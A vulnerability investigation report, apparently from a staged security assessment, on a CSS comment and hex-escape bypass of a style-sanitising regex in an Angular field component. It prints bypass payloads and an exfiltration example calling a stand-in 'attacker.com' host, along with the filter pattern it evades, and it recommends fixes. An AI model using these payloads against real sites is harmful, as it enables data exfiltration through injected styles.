# VULN-002-I: Investigation Report - css-comment-injection-bypass

**Phase**: Inquisitor
**Vulnerability ID**: VULN-002
**Descriptor**: css-comment-injection-bypass
**Assessment**: 2026-08-02-20-57
**Investigated**: 2026-08-02T22:00:00Z
**Analyst**: D4rthB0b-Inquisitor
**Status**: CONFIRMED

---

## Investigation Summary

**Confirmation**: This vulnerability has been CONFIRMED as exploitable.
**Confirmed At**: 2026-08-02T22:00:00Z

**Exploitability**: LOW

---

## Root Cause Analysis

The `getCss()` regex filter uses `\s*` which does not consume CSS comment sequences (`/**/`), so `url/**/(evil)` bypasses the pattern match. Additionally, CSS hex escape sequences (`jav\61script:`) normalize at browser render time but not before the regex test. However, the property allowlist (`ALLOWED_CSS_PROPS`) does not include any property that accepts `url()` values (no `background-image`, `cursor`, `border-image`), making the bypasses latently exploitable but currently blocked by the allowlist.

---

## Attack Scenario

Compromised ApplinX backend sends `field.style='background-color: url/**/(https://attacker.com/exfil)'`. The regex `!/url\s*\(/.test('background-color: url/**/(')` evaluates `TRUE` (no match), passing the check. If `background-image` were in `ALLOWED_CSS_PROPS`, the browser would execute a URL load to the attacker server. Currently blocked because `background-image` is not in `ALLOWED_CSS_PROPS`.

---

## Prerequisites

- ApplinX REST API backend compromised or acting maliciously
- Developer adds a `url()`-accepting property (`background-image`, `cursor`, etc.) to `ALLOWED_CSS_PROPS` without fixing regex — required for active exploitation
- User loads a screen with a field bearing the malicious style attribute

---

## Privilege Boundary Analysis

**Starting Privilege**: Compromised ApplinX REST API backend
**Achieved Privilege**: Same-origin CSS resource load (data exfiltration via URL, limited)
**Boundary Crossed**: YES

---

## Impact Assessment

**Confidentiality**: LOW
**Integrity**: NONE
**Availability**: NONE

### Impact Description

CSS-based data exfiltration is limited (URL parameters only, no JavaScript execution via CSS in modern browsers). `expression()` is IE6-IE7 only and not a risk in modern browsers. The current allowlist prevents exploitation, but the latent bypass means a single future allowlist change enables attack without further code changes.

---

## Data Flow Analysis

**Sources**:
- Field.style string from ApplinX REST API GetScreenResponse (server-controlled)

**Transformations**:
- Split by `;` to extract CSS declarations
- Extract property (before `:`) and value (after `:`), trim whitespace
- `ALLOWED_CSS_PROPS` allowlist check — primary gate (effective)
- Regex filter `!/url\s*\(|expression\s*\(|javascript\s*:/i` — secondary gate (bypassable via CSS comments and hex escapes)
- Angular `[style]='getCss()'` binding — no additional sanitization for STYLE context

**Sinks**:
- Inline style attribute on FieldComponent `<div>` element
- Inline style attribute on InputFieldComponent `<input>` element
- Browser CSS parser normalizes comments and escapes at render time

---

## Affected Components

### Direct Impact

- **FieldComponent.getCss()**: Regex filter bypassable; allowlist is primary defense
- **InputFieldComponent.getCss()**: Identical implementation — same bypass applies

### Indirect Impact

- **Future allowlist additions**: If `background-image` or `cursor` added to `ALLOWED_CSS_PROPS`, bypass becomes immediately exploitable without code review catching it

---

## Remediation Guidance

### Recommended Fix

Pre-normalize CSS values before regex test: (1) Strip CSS comments: `value.replace(/\/\*.*?\*\//gs, '')`. (2) Normalize CSS hex escapes before testing. (3) Consider per-property value validators (e.g., color accepts only `#hex`, `rgb()`, named colors) to eliminate the regex entirely and use strict value allowlisting.

**Priority**: MEDIUM

### Defense-in-Depth Recommendations

1. Strip CSS comments from values before regex check: `value.replace(/\/\*.*?\*\//gs, '')`
2. Normalize CSS hex escapes before regex: replace `\XX` hex sequences with decoded chars
3. Consider strict per-property value validators (regex per property type) instead of generic regex
4. Synchronize allowlist between FieldComponent and InputFieldComponent (currently duplicated — future divergence risk)
5. Add integration test: verify CSS comment and hex escape inputs are blocked

---

## References

**Scan Finding**: [VULN-002-S-scan-finding.md](VULN-002-S-scan-finding.md)

**Threat Model References**:
- TM-003

**Attack Surface References**:
- AS-001
- AS-004

**External References**:
- CSS Comments in property values: https://www.w3.org/TR/CSS21/syndata.html#comments
- CSS Unicode escapes: https://www.w3.org/TR/CSS21/syndata.html#escaped-characters

---

**Investigation Complete**: 2026-08-02T22:00:00Z
**Next Phase**: Exploiter (Validation)
**Registry**: [vulnerability-registry.md](../../vulnerability-registry.md)
